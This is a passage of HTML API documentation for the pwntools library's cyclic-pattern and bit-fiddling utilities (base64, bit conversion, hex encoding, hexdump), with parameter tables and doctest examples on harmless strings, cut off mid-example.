<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>alphabet</strong> &#8211; List or string to generate the sequence over.</li>
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The length of subsequences that should be unique.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.cyclic.metasploit_pattern">
<code class="descclassname">pwnlib.util.cyclic.</code><code class="descname">metasploit_pattern</code><span class="sig-paren">(</span><em>sets = [ string.ascii_uppercase, string.ascii_lowercase, string.digits ]</em><span class="sig-paren">)</span> &#x2192; generator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/cyclic.py#L133-159"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.cyclic.metasploit_pattern" title="Permalink to this definition">¶</a></dt>
<dd><p>Generator for a sequence of characters as per Metasploit Framework&#8217;s
<cite>Rex::Text.pattern_create</cite> (aka <cite>pattern_create.rb</cite>).</p>
<p>The returned generator will yield up to
<code class="docutils literal"><span class="pre">len(sets)</span> <span class="pre">*</span> <span class="pre">reduce(lambda</span> <span class="pre">x,y:</span> <span class="pre">x*y,</span> <span class="pre">map(len,</span> <span class="pre">sets))</span></code> elements.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>sets</strong> &#8211; List of strings to generate the sequence over.</td>
</tr>
</tbody>
</table>
</dd></dl>

</div>
<span id="document-util/fiddling"></span><div class="section" id="module-pwnlib.util.fiddling">
<span id="pwnlib-util-fiddling-utilities-bit-fiddling"></span><h3><a class="reference internal" href="#module-pwnlib.util.fiddling" title="pwnlib.util.fiddling"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.fiddling</span></code></a> &#8212; Utilities bit fiddling<a class="headerlink" href="#module-pwnlib.util.fiddling" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.util.fiddling.b64d">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">b64d</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L274-284"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.b64d" title="Permalink to this definition">¶</a></dt>
<dd><p>Base64 decodes a string</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">b64d</span><span class="p">(</span><span class="s1">&#39;dGVzdA==&#39;</span><span class="p">)</span>
<span class="go">&#39;test&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.b64e">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">b64e</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L262-272"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.b64e" title="Permalink to this definition">¶</a></dt>
<dd><p>Base64 encodes a string</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">b64e</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">)</span>
<span class="go">&#39;dGVzdA==&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.bits">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">bits</code><span class="sig-paren">(</span><em>s</em>, <em>endian = 'big'</em>, <em>zero = 0</em>, <em>one = 1</em><span class="sig-paren">)</span> &#x2192; list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L97-153"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.bits" title="Permalink to this definition">¶</a></dt>
<dd><p>Converts the argument a list of bits.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>s</strong> &#8211; A string or number to be converted into bits.</li>
<li><strong>endian</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The binary endian, default &#8216;big&#8217;.</li>
<li><strong>zero</strong> &#8211; The representing a 0-bit.</li>
<li><strong>one</strong> &#8211; The representing a 1-bit.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A list consisting of the values specified in <cite>zero</cite> and <cite>one</cite>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bits</span><span class="p">(</span><span class="mi">511</span><span class="p">,</span> <span class="n">zero</span> <span class="o">=</span> <span class="s2">&quot;+&quot;</span><span class="p">,</span> <span class="n">one</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">)</span>
<span class="go">[&#39;+&#39;, &#39;+&#39;, &#39;+&#39;, &#39;+&#39;, &#39;+&#39;, &#39;+&#39;, &#39;+&#39;, &#39;-&#39;, &#39;-&#39;, &#39;-&#39;, &#39;-&#39;, &#39;-&#39;, &#39;-&#39;, &#39;-&#39;, &#39;-&#39;, &#39;-&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">sum</span><span class="p">(</span><span class="n">bits</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">))</span>
<span class="go">17</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bits</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.bits_str">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">bits_str</code><span class="sig-paren">(</span><em>s</em>, <em>endian = 'big'</em>, <em>zero = '0'</em>, <em>one = '1'</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L155-167"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.bits_str" title="Permalink to this definition">¶</a></dt>
<dd><p>A wrapper around <a class="reference internal" href="#pwnlib.util.fiddling.bits" title="pwnlib.util.fiddling.bits"><code class="xref py py-func docutils literal"><span class="pre">bits()</span></code></a>, which converts the output into a string.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bits_str</span><span class="p">(</span><span class="mi">511</span><span class="p">)</span>
<span class="go">&#39;0000000111111111&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bits_str</span><span class="p">(</span><span class="s2">&quot;bits_str&quot;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;little&quot;</span><span class="p">)</span>
<span class="go">&#39;0100011010010110001011101100111011111010110011100010111001001110&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.bitswap">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">bitswap</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L216-231"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.bitswap" title="Permalink to this definition">¶</a></dt>
<dd><p>Reverses the bits in every byte of a given string.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bitswap</span><span class="p">(</span><span class="s2">&quot;1234&quot;</span><span class="p">)</span>
<span class="go">&#39;\x8cL\xcc,&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.bitswap_int">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">bitswap_int</code><span class="sig-paren">(</span><em>n</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L233-259"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.bitswap_int" title="Permalink to this definition">¶</a></dt>
<dd><p>Reverses the bits of a numbers and returns the result as a new number.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The number to swap.</li>
<li><strong>width</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The width of the integer</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">bitswap_int</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
<span class="go">&#39;0x2c&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">bitswap_int</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
<span class="go">&#39;0x2c48&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">bitswap_int</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">,</span> <span class="mi">24</span><span class="p">))</span>
<span class="go">&#39;0x2c4800&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">bitswap_int</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">,</span> <span class="mi">25</span><span class="p">))</span>
<span class="go">&#39;0x589000&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.bnot">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">bnot</code><span class="sig-paren">(</span><em>value</em>, <em>width=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L917-924"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.bnot" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the binary inverse of &#8216;value&#8217;.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.enhex">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">enhex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L39-49"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.enhex" title="Permalink to this definition">¶</a></dt>
<dd><p>Hex-encodes a string.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">enhex</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">)</span>
<span class="go">&#39;74657374&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.hexdump">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">hexdump</code><span class="sig-paren">(</span><em>s</em>, <em>width=16</em>, <em>skip=True</em>, <em>hexii=False</em>, <em>begin=0</em>, <em>style=None</em>, <em>highlight=None</em>, <em>cyclic=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L731-906"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.hexdump" title="Permalink to this definition">¶</a></dt>
<dd><dl class="docutils">
<dt>hexdump(s, width = 16, skip = True, hexii = False, begin = 0,</dt>
<dd>style = None, highlight = None, cyclic = False) -&gt; str generator</dd>
</dl>
<p>Return a hexdump-dump of a string.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>s</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to hexdump.</li>
<li><strong>width</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The number of characters per line</li>
<li><strong>skip</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set to True, if repeated lines should be replaced by a &#8220;*&#8221;</li>
<li><strong>hexii</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set to True, if a hexii-dump should be returned instead of a hexdump.</li>
<li><strong>begin</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Offset of the first byte to print in the left column</li>
<li><strong>style</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Color scheme to use.</li>
<li><strong>highlight</strong> (<em>iterable</em>) &#8211; Byte values to highlight.</li>
<li><strong>cyclic</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Attempt to skip consecutive, unmodified cyclic lines</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A hexdump-dump in the form of a string.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s2">&quot;abc&quot;</span><span class="p">)</span>
<span class="go">00000000  61 62 63                                            │abc│</span>
<span class="go">00000003</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
<span class="go">00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span>
<span class="go">*</span>
<span class="go">00000020</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
<span class="go">00000000  41 41 41 41  41 41 41 41   │AAAA│AAAA│</span>
<span class="go">*</span>
<span class="go">00000020</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="n">width</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">begin</span><span class="o">=</span><span class="mh">0xdead0000</span><span class="p">,</span> <span class="n">hexii</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">dead0000  .a  .a  .a  .a   .b  .a  .a  .a  │</span>
<span class="go">dead0008  .c  .a  .a  .a   .d  .a  .a  .a  │</span>
<span class="go">dead0010  .e  .a  .a  .a   .f  .a  .a  .a  │</span>
<span class="go">dead0018  .g  .a  .a  .a   .h  .a  .a  .a  │</span>
<span class="go">dead0020</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))))</span>
<span class="go">00000000  00 01 02 03  04 05 06 07  08 09 0a 0b  0c 0d 0e 0f  │····│····│····│····│</span>
<span class="go">00000010  10 11 12 13  14 15 16 17  18 19 1a 1b  1c 1d 1e 1f  │····│····│····│····│</span>
<span class="go">00000020  20 21 22 23  24 25 26 27  28 29 2a 2b  2c 2d 2e 2f  │ !&quot;#│$%&amp;&#39;│()*+│,-./│</span>
<span class="go">00000030  30 31 32 33  34 35 36 37  38 39 3a 3b  3c 3d 3e 3f  │0123│4567│89:;│&lt;=&gt;?│</span>
<span class="go">00000040  40 41 42 43  44 45 46 47  48 49 4a 4b  4c 4d 4e 4f  │@ABC│DEFG│HIJK│LMNO│</span>
<span class="go">00000050  50 51 52 53  54 55 56 57  58 59 5a 5b  5c 5d 5e 5f  │PQRS│TUVW│XYZ[│\]^_│</span>
<span class="go">00000060  60 61 62 63  64 65 66 67  68 69 6a 6b  6c 6d 6e 6f  │`abc│defg│hijk│lmno│</span>
<span class="go">00000070  70 71 72 73  74 75 76 77  78 79 7a 7b  7c 7d 7e 7f  │pqrs│tuvw│xyz{│|}~·│</span>
<span class="go">00000080  80 81 82 83  84 85 86 87  88 89 8a 8b  8c 8d 8e 8f  │····│····│····│····│</span>
<span class="go">00000090  90 91 92 93  94 95 96 97  98 99 9a 9b  9c 9d 9e 9f  │····│····│····│····│</span>
<span class="go">000000a0  a0 a1 a2 a3  a4 a5 a6 a7  a8 a9 aa ab  ac ad ae af  │····│····│····│····│</span>
<span class="go">000000b0  b0 b1 b2 b3  b4 b5 b6 b7  b8 b9 ba bb  bc bd be bf  │····│····│····│····│</span>
<span class="go">000000c0  c0 c1 c2 c3  c4 c5 c6 c7  c8 c9 ca cb  cc cd ce cf  │····│····│····│····│</span>
<span class="go">000000d0  d0 d1 d2 d3  d4 d5 d6 d7  d8 d9 da db  dc dd de df  │····│····│····│····│</span>
<span class="go">000000e0  e0 e1 e2 e3  e4 e5 e6 e7  e8 e9 ea eb  ec ed ee ef  │····│····│····│····│</span>
<span class="go">000000f0  f0 f1 f2 f3  f4 f5 f6 f7  f8 f9 fa fb  fc fd fe ff  │····│····│····│····│</span>
<span class="go">00000100</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))),</span> <span class="n">hexii</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">00000000      01  02  03   04  05  06  07   08  09  0a  0b   0c  0d  0e  0f  │</span>
<span class="go">00000010  10  11  12  13   14  15  16  17   18  19  1a  1b   1c  1d  1e  1f  │</span>
<span class="go">00000020  20  .!  .&quot;  .#   .$  .%  .&amp;  .&#39;   .(  .)  .*  .+   .,  .-  ..  ./  │</span>
<span class="go">00000030  .0  .1  .2  .3   .4  .5  .6  .7   .8  .9  .:  .;   .&lt;  .=  .&gt;  .?  │</span>
<span class="go">00000040  .@  .A  .B  .C   .D  .E  .F  .G   .H  .I  .J  .K   .L  .M  .N  .O  │</span>
<span class="go">00000050  .P  .Q  .R  .S   .T  .U  .V  .W   .X  .Y  .Z  .[   .\  .]  .^  ._  │</span>
<span class="go">00000060  .`  .a  .b  .c   .d  .e  .f  .g   .h  .i  .j  .k   .l  .m  .n  .o  │</span>
<span class="go">00000070  .p  .q  .r  .s   .t  .u  .v  .w   .x  .y  .z  .{   .|  .}  .~  7f  │</span>
<span class="go">00000080  80  81  82  83   84  85  86  87   88  89  8a  8b   8c  8d  8e  8f  │</span>
<span class="go">00000090  90  91  92  93   94  95  96  97   98  99  9a  9b   9c  9d  9e  9f  │</span>
<span class="go">000000a0  a0  a1  a2  a3   a4  a5  a6  a7   a8  a9  aa  ab   ac  ad  ae  af  │</span>
<span class="go">000000b0  b0  b1  b2  b3   b4  b5  b6  b7   b8  b9  ba  bb   bc  bd  be  bf  │</span>
<span class="go">000000c0  c0  c1  c2  c3   c4  c5  c6  c7   c8  c9  ca  cb   cc  cd  ce  cf  │</span>
<span class="go">000000d0  d0  d1  d2  d3   d4  d5  d6  d7   d8  d9  da  db   dc  dd  de  df  │</span>
<span class="go">000000e0  e0  e1  e2  e3   e4  e5  e6  e7   e8  e9  ea  eb   ec  ed  ee  ef  │</span>
<span class="go">000000f0  f0  f1  f2  f3   f4  f5  f6  f7   f8  f9  fa  fb   fc  fd  fe  ##  │</span>
<span class="go">00000100</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span>
<span class="go">00000000  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│</span>
<span class="go">*</span>
<span class="go">00000040</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">,</span> <span class="n">skip</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="go">00000000  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│</span>
<span class="go">00000010  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│</span>
<span class="go">00000020  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│</span>
<span class="go">00000030  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│</span>
<span class="go">00000040</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="n">fit</span><span class="p">({</span><span class="mh">0x10</span><span class="p">:</span> <span class="s1">&#39;X&#39;</span><span class="o">*</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x50</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">20</span><span class="p">},</span> <span class="n">length</span><span class="o">=</span><span class="mh">0xc0</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
<span class="go">00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│</span>
<span class="go">00000010  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│</span>
<span class="go">*</span>
<span class="go">00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│</span>
<span class="go">00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 ff  │qaaa│raaa│saaa│taa·│</span>
<span class="go">00000050  ff ff ff ff  ff ff ff ff  ff ff ff ff  ff ff ff ff  │····│····│····│····│</span>
<span class="go">00000060  ff ff ff 61  7a 61 61 62  62 61 61 62  63 61 61 62  │···a│zaab│baab│caab│</span>
<span class="go">00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│</span>
<span class="go">00000080  68 61 61 62  69 61 61 62  6a 61 61 62  6b 61 61 62  │haab│iaab│jaab│kaab│</span>
<span class="go">00000090  6c 61 61 62  6d 61 61 62  6e 61 61 62  6f 61 61 62  │laab│maab│naab│oaab│</span>
<span class="go">000000a0  70 61 61 62  71 61 61 62  72 61 61 62  73 61 61 62  │paab│qaab│raab│saab│</span>
<span class="go">000000b0  74 61 61 62  75 61 61 62  76 61 61 62  77 61 61 62  │taab│uaab│vaab│waab│</span>
<span class="go">000000c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span>
<span class="go">*</span>
<span class="go">000000e0</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="n">fit</span><span class="p">({</span><span class="mh">0x10</span><span class="p">:</span> <span class="s1">&#39;X&#39;</span><span class="o">*</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x50</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">20</span><span class="p">},</span> <span class="n">length</span><span class="o">=</span><span class="mh">0xc0</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span> <span class="n">cyclic</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="go">00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│</span>
<span class="go">00000010  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│</span>
<span class="go">*</span>
<span class="go">00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│</span>
<span class="go">00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 ff  │qaaa│raaa│saaa│taa·│</span>
<span class="go">00000050  ff ff ff ff  ff ff ff ff  ff ff ff ff  ff ff ff ff  │····│····│····│····│</span>
<span class="go">00000060  ff ff ff 61  7a 61 61 62  62 61 61 62  63 61 61 62  │···a│zaab│baab│caab│</span>
<span class="go">00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│</span>
<span class="go">*</span>
<span class="go">000000c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span>
<span class="go">*</span>
<span class="go">000000e0</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="n">fit</span><span class="p">({</span><span class="mh">0x10</span><span class="p">:</span> <span class="s1">&#39;X&#39;</span><span class="o">*</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x50</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">20</span><span class="p">},</span> <span class="n">length</span><span class="o">=</span><span class="mh">0xc0</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span> <span class="n">cyclic</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hexii</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="go">00000000  .a  .a  .a  .a   .b  .a  .a  .a   .c  .a  .a  .a   .d  .a  .a  .a  │</span>
<span class="go">00000010  .X  .X  .X  .X   .X  .X  .X  .X   .X  .X  .X  .X   .X  .X  .X  .X  │</span>
<span class="go">*</span>
<span class="go">00000030  .m  .a  .a  .a   .n  .a  .a  .a   .o  .a  .a  .a   .p  .a  .a  .a  │</span>
<span class="go">00000040  .q  .a  .a  .a   .r  .a  .a  .a   .s  .a  .a  .a   .t  .a  .a  ##  │</span>
<span class="go">00000050  ##  ##  ##  ##   ##  ##  ##  ##   ##  ##  ##  ##   ##  ##  ##  ##  │</span>
<span class="go">00000060  ##  ##  ##  .a   .z  .a  .a  .b   .b  .a  .a  .b   .c  .a  .a  .b  │</span>
<span class="go">00000070  .d  .a  .a  .b   .e  .a  .a  .b   .f  .a  .a  .b   .g  .a  .a  .b  │</span>
<span class="go">*</span>
<span class="go">000000c0                                                                     │</span>
<span class="go">*</span>
<span class="go">000000e0</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">9</span><span class="p">)</span>
